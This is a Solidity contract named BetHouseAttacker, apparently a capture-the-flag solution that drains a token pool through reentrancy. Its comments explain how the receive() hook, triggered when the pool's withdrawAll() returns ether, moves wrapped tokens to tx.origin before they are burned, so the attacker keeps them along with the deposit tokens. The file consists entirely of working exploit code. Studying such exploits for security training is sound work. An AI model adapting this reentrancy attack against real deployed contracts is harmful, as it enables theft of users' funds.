// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPool {
    function deposit(uint256 value_) external payable;
    function withdrawAll() external;
    function wrappedToken() external returns(address);
    function depositToken() external returns(address);
}

interface IPoolToken{
    function approve(address spender, uint256 value) external;
    function transferFrom(address from, address to, uint256 value) external;
    function transfer(address to, uint256 value) external;
}


contract BetHouseAttacker {
    address poolAddress;

    constructor(address _targetAddress) {
        poolAddress = _targetAddress;
    }

    //The player transfers the 5 PDTs to this contract externally,
    // the contract needs to approve the transfer of tokens to poolAddress
    // deposit is then called to deposit 5 PDT and 0.001 ether to poolAddress,
    // this gives this token 15 wrapped tokens in return the first time
    // next call to deposit will only create 5 wrapped tokens 
    //since ether can be sent only once.
    function deposit() payable external{
        address depositToken = IPool(poolAddress).depositToken();
        IPoolToken(depositToken).approve(poolAddress, 5);
        IPool(poolAddress).deposit{value:msg.value}(5);
    }

    //withdraw is called to call  withdrawAll() on pool contract
    function withdraw() external {
        IPool(poolAddress).withdrawAll();
    }


    //when withdrawAll() is called on pool contract, it also sends the ether back and this is where
    // the exploit happens, this contract transfers all the wrapped tokens to tx.origin before they are
    // burned, which happens when ether is being transferred from poolAddress to this contract, 
    // this way we have 15 wrapped tokens
    // and 5 PDTs in possession again

    // next external call to deposit on this contract to deposit 5 PDTs in pool and get 5 wrapped tokens
    // next external call to transferToOrigin to transfer remaining 5 PDTs
    receive() external payable { 
        transferToOrigin(15);
    }

    // transfers wrapped tokens to origin
    function transferToOrigin(uint256 _value) public {
        address wrappedToken = IPool(poolAddress).wrappedToken();
        IPoolToken(wrappedToken).transfer(tx.origin, _value);
    }

    // transfer PDT back to tx.origin if need be
    function transferDepositTokenToOrigin(uint256 _value) public {
        address depositToken = IPool(poolAddress).depositToken();
        IPoolToken(depositToken).transfer(tx.origin, _value);
    }

}
